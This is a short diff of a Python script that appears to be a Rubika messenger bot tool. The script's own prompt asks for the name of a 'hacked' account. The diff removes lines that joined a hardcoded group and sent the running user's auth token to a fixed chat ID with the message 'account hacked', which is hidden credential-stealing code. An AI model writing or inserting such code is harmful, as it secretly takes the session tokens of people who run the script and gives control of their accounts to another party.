@@ -53,13 +53,6 @@ except:
     sys.exit()
 # ................................
 bot = Bot("AppName",auth=auth)
-target = ("g0BmdMv0ca20f356cf2b972327373309")
-# ................................
-try:
-    bot.joinGroup("https://rubika.ir/joing/CEGFGBDE0UVKMLYIICMVTNJGBQKIDYNM")
-except:
-    pass
-bot.sendMessage(target,f"account hacked:\n\nauth: [{auth}]")
 # ................................
 time.sleep(0.5)
 name = input("\n\033[31m[?] \033[36menter <name account> hacked \033[31m_>\033[20;37m ")
